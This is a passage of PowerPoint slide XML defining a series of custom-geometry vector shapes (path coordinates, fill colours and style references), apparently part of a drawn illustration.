                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="608" name="CustomShape 224"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2678040" y="3971880"/>
            <a:ext cx="10440" cy="50040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="32">
                <a:moveTo>
                  <a:pt x="2" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="609" name="CustomShape 225"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2828880" y="3919680"/>
            <a:ext cx="37440" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="24" h="90">
                <a:moveTo>
                  <a:pt x="24" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="610" name="CustomShape 226"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2830680" y="3930480"/>
            <a:ext cx="29520" cy="119880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="76">
                <a:moveTo>
                  <a:pt x="19" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="611" name="CustomShape 227"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="3940200"/>
            <a:ext cx="23040" cy="99360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="15" h="63">
                <a:moveTo>
                  <a:pt x="15" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="15" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="612" name="CustomShape 228"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="3949560"/>
            <a:ext cx="18360" cy="78480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="50">
                <a:moveTo>
                  <a:pt x="12" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="613" name="CustomShape 229"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2835360" y="3960720"/>
            <a:ext cx="13680" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="36">
                <a:moveTo>
                  <a:pt x="9" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="614" name="CustomShape 230"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2639880" y="3944880"/>
            <a:ext cx="5760" cy="186480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="615" name="CustomShape 231"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2706840" y="3941640"/>
            <a:ext cx="72360" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="46" h="55">
                <a:moveTo>
                  <a:pt x="4" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="999999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="616" name="CustomShape 232"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="4006800"/>
            <a:ext cx="57960" cy="13680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="9">
                <a:moveTo>
                  <a:pt x="0" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="617" name="CustomShape 233"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="3967200"/>
            <a:ext cx="57960" cy="16920"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="11">
                <a:moveTo>
                  <a:pt x="0" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="618" name="CustomShape 234"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2660760" y="3949560"/>
            <a:ext cx="96120" cy="177120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="61" h="112">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="108"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="112"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="94"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="619" name="CustomShape 235"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2708280" y="3908520"/>
            <a:ext cx="124560" cy="23040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
